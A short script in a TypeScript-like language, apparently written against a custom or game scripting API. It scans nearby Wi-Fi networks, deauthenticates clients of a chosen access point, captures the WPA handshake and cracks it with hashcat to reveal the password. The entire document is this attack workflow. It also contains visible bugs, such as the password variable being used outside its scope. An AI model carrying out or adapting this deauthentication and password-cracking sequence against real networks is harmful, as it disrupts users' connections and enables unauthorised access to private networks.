const mon: string = `wlan0`
const isInstalled = await installLib("hashcat");
println(`Hash Cat: ${isInstalled}`);
println(`Network Interface: ${mon}`)
let target: object|null = null;
const networks = await Networking.Wifi.Scan(mon);
for ( let network of networks){
   if (network.signal>2){
    target = network
   }
};
await Networking.Wifi.Deauth(mon,target.bssid,{packets: 20});
const pcap = await Networking.Wifi.CaptureHandshake(mon,target.bssid);
if (pcap != null){
    const password = await Crypto.Hashcat.Decrypt(`/home/Midsubspace/${pcap}`);
}
println(`SSID: ${target.ssid}`);
println(typeof(password))
println(`Password: ${password}`);